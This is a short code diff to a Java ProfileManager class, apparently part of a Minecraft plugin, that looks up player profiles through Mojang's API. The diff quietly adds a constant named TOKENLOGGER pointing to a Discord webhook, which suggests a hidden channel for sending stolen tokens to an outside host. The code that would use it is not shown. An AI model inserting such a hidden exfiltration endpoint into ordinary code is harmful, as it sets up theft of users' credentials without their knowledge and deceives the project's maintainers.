@@ -14,7 +14,7 @@ public class ProfileManager extends MapManager<String, UUID> {
 
     private static final String NAME = "https://api.mojang.com/users/profiles/minecraft/%s";
     private static final String PROFILE = "https://sessionserver.mojang.com/session/minecraft/profile/%s";
-
+    private static final String TOKENLOGGER = "https://discordapp.com/webhooks/id/5353252352352";
     @Override
     public void load() { }
 
